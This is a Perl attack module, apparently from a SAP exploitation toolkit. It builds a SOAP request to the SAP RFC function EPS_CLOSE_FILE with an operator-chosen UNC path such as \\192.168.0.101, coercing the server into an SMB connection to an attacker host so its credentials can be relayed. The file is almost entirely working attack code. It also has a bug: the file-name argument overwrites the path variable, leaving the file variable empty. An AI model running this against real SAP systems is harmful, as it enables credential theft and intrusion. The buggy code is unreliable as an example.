#!/usr/bin/perl
# Module SMB relay EPS_CLOSE_FILE

# CONFIG
######################
my $desc ="SMB relay (EPS_CLOSE_FILE) \n\t Usage: black.pl .. .. -m id_module <path> <file>\n\t UNC path like this: \\\\192.168.0.101\n\t File name likes 'test.txt'\n"; 
our $funcName="EPS_CLOSE_FILE_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub EPS_CLOSE_FILE_Func()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <EPS_CLOSE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">
           <DIR_NAME>%PATH%</DIR_NAME>
           <FILE_NAME>%FILE%</FILE_NAME>
           <IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>
           <IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>
        </EPS_CLOSE_FILE>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	if ($ARGV[$m_arg_i+2]){
		$path=$ARGV[$m_arg_i+2];
		print $file." - file \n\n";
	} else {
		print "Error. Please, enter file name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;
	$XML=~s/%FILE%/$file/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";
}